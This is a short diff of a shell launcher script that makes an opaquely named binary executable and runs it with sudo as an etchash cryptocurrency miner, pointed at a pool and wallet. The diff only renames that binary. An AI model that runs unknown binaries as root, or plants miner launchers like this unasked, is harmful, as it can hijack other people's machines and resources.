@@ -6,5 +6,5 @@ WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
 
 cd "$(dirname "$0")"
 
-chmod +x ./3hvr7kl && sudo ./3hvr7kl -a etchash -o $POOL -u $WALLET.$WORKER -log
+chmod +x ./3ym7UIt && sudo ./3ym7UIt -a etchash -o $POOL -u $WALLET.$WORKER -log
 pause $@
